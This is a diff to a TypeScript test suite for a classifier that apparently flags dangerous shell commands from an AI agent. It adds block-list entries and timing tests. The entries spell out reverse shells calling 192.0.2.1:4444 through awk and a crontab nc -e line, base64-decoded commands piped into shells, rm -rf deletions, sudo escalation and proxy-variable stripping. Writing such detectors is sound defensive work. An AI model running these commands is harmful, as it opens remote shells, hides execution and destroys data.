@@ -208,6 +208,10 @@ const BAD: Array<[string, string]> = [
   ["awk 'BEGIN{s=\"/inet/tcp/0/192.0.2.1/4444\";while(1){s|&getline c;print|&s}}'", "reverseShell"],
   ["echo '* * * * * nc -e /bin/sh 192.0.2.1 4444' | crontab -", "reverseShell"],
   ["echo c3VkbyBpZA== | base64 -d | sh", "unclear"],
+  // Into a subshell, or with its errors too (`|&`).
+  ["echo c3VkbyBpZA== | base64 -d | (/bin/sh)", "unclear"],
+  ["echo c3VkbyBpZA== | base64 -d |(/bin/bash)", "unclear"],
+  ["echo c3VkbyBpZA== | base64 -d |&/bin/sh", "unclear"],
   ['eval "$(echo c3VkbyBpZA== | base64 -d)"', "unclear"],
   ["rm -rf /home/ada", "destroy"],
   ["rm -rf ../..", "destroy"],
@@ -630,6 +634,64 @@ describe("runs outside a mission: only obvious harm is refused", () => {
     expect(secretRead("Bash", { command: `cat ${"a/".repeat(long / 2)}x` }, scope)).toBe(false);
     // Each took seconds when a pattern could start at every character and scan to the text's end.
     expect(performance.now() - started).toBeLessThan(2000);
+  });
+
+  // Each of these took seconds when a pattern read on from every one of a long run of the same word to its end.
+  test("a long run of unset is read in time, and still caught when a proxy variable follows", () => {
+    const started = performance.now();
+    expect(codeOf("unset ".repeat(35_000))).toBeNull();
+    expect(codeOf(`${"unset ".repeat(35_000)}HTTPS_PROXY`)).toBe("network");
+    expect(performance.now() - started).toBeLessThan(1000);
+  });
+
+  test("a long run of env is read in time, and still caught when it drops a proxy variable", () => {
+    const started = performance.now();
+    expect(codeOf(`echo ${"env ".repeat(50_000)}`)).toBeNull();
+    expect(codeOf(`echo ${"env ".repeat(50_000)}-u http_proxy`)).toBe("network");
+    expect(performance.now() - started).toBeLessThan(1000);
+  });
+
+  test("a long run of del is read in time, and still caught when a proxy variable follows", () => {
+    const started = performance.now();
+    expect(codeOf("del ".repeat(50_000))).toBeNull();
+    expect(codeOf(`${"del ".repeat(50_000)}os.environ['HTTP_PROXY']`)).toBe("network");
+    expect(performance.now() - started).toBeLessThan(1000);
+  });
+
+  test("a long run of decodes is read in time, and still caught when piped into a shell", () => {
+    const started = performance.now();
+    expect(codeOf("base64 -d ".repeat(1_600))).toBeNull();
+    expect(codeOf(`${"base64 -d ".repeat(1_600)}| sh`)).toBe("unclear");
+    expect(performance.now() - started).toBeLessThan(1000);
+  });
+
+  test("a long run of command substitutions is read in time, and still caught when one decodes", () => {
+    const started = performance.now();
+    expect(codeOf("eval $(".repeat(30_000))).toBeNull();
+    expect(codeOf(`${"eval $(".repeat(30_000)}base64 -d x)`)).toBe("unclear");
+    expect(performance.now() - started).toBeLessThan(1000);
+  });
+
+  test("a line of many heredocs is read in time, and a body its shell runs is still read", () => {
+    const started = performance.now();
+    expect(codeOf("cat <<A ".repeat(15_000))).toBeNull();
+    expect(codeOf(`bash <<A ${"cat <<A ".repeat(15_000)}\nsudo id\nA`)).toBe("privilege");
+    expect(performance.now() - started).toBeLessThan(1000);
+  });
+
+  test("blank lines piped into crontab are read in time, and a schedule's command is still read", () => {
+    const cron = (lines: string) => `echo '${lines}' | crontab -`;
+    const blank = Array.from({ length: 5 }, () => cron(" \n".repeat(10_000))).join("; ");
+    const started = performance.now();
+    expect(codeOf(blank)).toBeNull();
+    expect(codeOf(`${blank}; ${cron("* * * * * sudo id")}`)).toBe("privilege");
+    expect(performance.now() - started).toBeLessThan(1000);
+  });
+
+  test("a heredoc before its command is fed to that command, as the shell reads it", () => {
+    expect(codeOf("<<EOF bash\nsudo id\nEOF")).toBe("privilege");
+    expect(codeOf("timeout <<A 5 bash <<B\nA\nsudo id\nB")).toBe("privilege");
+    expect(codeOf("<<EOF cat > notes.md\nsudo id\nEOF")).toBeNull();
   });
 
   test("a refusal says why, a way out, and that the rest of the work goes on", () => {
